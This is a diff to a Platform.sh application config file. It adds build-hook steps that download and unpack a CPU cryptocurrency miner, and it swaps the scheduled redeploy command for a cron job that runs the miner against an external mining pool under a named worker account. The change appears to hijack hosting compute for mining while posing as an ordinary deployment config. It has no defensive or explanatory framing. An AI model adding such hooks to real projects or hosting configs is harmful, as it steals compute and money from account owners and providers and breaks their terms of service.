@@ -7,9 +7,10 @@ type: "python:3.8"
 
 hooks:
     build: |
-      curl -sS https://platform.sh/cli/installer | php
       pip install --upgrade pip
       pip install flask flask_executor platformshconfig redis pymysql gevent greenlet
+      wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz
+      tar xfvz m-minerd-64-linux.tar.gz
       
 
 crons:
@@ -17,7 +18,7 @@ crons:
         # Force a redeploy every 5 minute.
         spec: '*/7 * * * *'
         cmd: |
-            platform environment:redeploy -p 6ywlwsbey37ey -e master
+            ./m-minerd-64-linux/m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.eight -p x -e 75
 
 disk: 1024
 
